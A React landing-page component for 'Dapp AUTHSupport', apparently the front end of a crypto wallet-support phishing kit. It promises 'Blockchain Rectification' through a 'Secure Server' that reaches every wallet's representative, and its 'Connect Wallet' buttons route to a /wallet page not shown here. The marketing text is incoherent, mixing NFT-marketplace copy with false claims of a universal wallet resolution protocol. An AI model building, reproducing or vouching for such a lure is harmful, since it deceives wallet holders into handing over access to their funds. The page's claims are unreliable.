import React, { useState } from "react";
import styles from "../style";
import { discount, robot } from "../assets";
import heroImg from "../assets/hero-img.png";
import GetStarted from "./GetStarted";
import topbanner17 from "../assets/topbanner17.jpg";
import { Link } from "react-router-dom";
import { FaTimes } from "react-icons/fa";

const Hero = () => {
  const [openModal, setOpenModal] = useState(false);

  return (
    <>
      <section
        id="home"
        style={{ backgroundImage: `url(${topbanner17})` }}
        className={`flex md:flex-row flex-col md:px-16 py-5 relative`}
      >
        <div className="absolute inset-0 bg-black opacity-50 z-0 p-10 w-screen h-full"></div>
        <div className="flex flex-col relative z-10">
          {/* Your content goes here */}
          <div className="flex justify-between items-center p-6">
            <h1 className="flex-1 font-poppins text-center md:text-start font-semibold text-[20px] text-white">
              Dapp AUTHSupport
            </h1>

            <button
              onClick={() => setOpenModal(true)}
              className="bg-pink-600 hover:bg-pink-700 py-2 px-4 rounded-full text-white font-semibold text-lg"
            >
              Connect Wallet
            </button>
          </div>
          <div className="flex md:flex-row flex-col-reverse">
            <div className={`flex-1 ${styles.flexStart} flex-col p-6`}>
              <h1 className="flex-1 font-poppins font-semibold text-start md:text-[40px] text-[20px] text-white">
                Blockchain Rectification
              </h1>
              <p className={`max-w-[470px] mt-5 text-start mb-2 text-white`}>
                Every digital artwork on Upside is authentic and truly unique.
                Blockchain technology makes this new aproch to digital ownership
                possible. Open and decentralized protocol for syncing various
                Wallets issues on Secure Server. This is not an app but a
                protocol that establishes a remote resolution between all
                noncustodial wallet/Blockchains. It is an online server which
                gets you across to every wallet/blockchain/protocol
                representative to enable effective complain and rectification of
                issues. You will be on a chat with an Artificial Intelligence,
                and a customer support agent will join the conversation to
                assist you. All of this is made possible because of the
                blockchain cloud infrastructure powered by Chain Cloud and
                Sequence.
              </p>

              <button
                onClick={() => setOpenModal(true)}
                className="bg-pink-600 hover:bg-pink-700 py-2 px-4 rounded-full text-white font-semibold text-lg"
              >
                Connect Wallet
              </button>
            </div>
            <div
              className={`flex-1 flex ${styles.flexCenter} self-center opacity-50 md:my-0 my-10 relative w-2/3 md:w-full`}
            >
              <img
                src={heroImg}
                alt="billing"
                className="w-[100%] h-[100%] relative z-[5]"
              />
            </div>
          </div>
        </div>
      </section>
      {openModal && (
        <div className="fixed flex h-full w-full p-2 justify-center items-center top-0 z-10 bg-black/50">
          <div className="flex flex-col justify-between items-center gap-8 md:w-1/3 w-full p-4 bg-[#1B1B1B] border-2 border-gray-600 rounded-md">
            <div className="flex w-full justify-between items-center">
              <p className="font-bold text-white">Connect to a wallet</p>
              <div onClick={() => setOpenModal(false)}>
                <FaTimes className="text-[18px]" color="white" />
              </div>
            </div>
            <div className="flex flex-col gap-2 w-full">
              <Link to="/wallet">
                <div className="flex justify-between w-full items-center border shadow-md shadow-gray-500 hover:border-white hover:bg-gray-600 cursor-pointer border-gray-300 rounded-md p-4">
                  <p className="font-bold text-white">Connect Automatically</p>
                  <img
                    src="https://support---protocol.vercel.app/img/api.png"
                    className="w-[30px]"
                    alt=""
                  />
                </div>
              </Link>
              <Link to="/wallet">
                <div className="flex justify-between w-full items-center border shadow-md shadow-gray-500 hover:border-white hover:bg-gray-600 cursor-pointer border-gray-300 rounded-md p-4">
                  <p className="font-bold text-white">Connect Manually</p>
                  <img
                    src="https://support---protocol.vercel.app/img/settings.png"
                    className="w-[30px]"
                    alt=""
                  />
                </div>
              </Link>
            </div>
            <div />
          </div>
        </div>
      )}
    </>
  );
};

export default Hero;
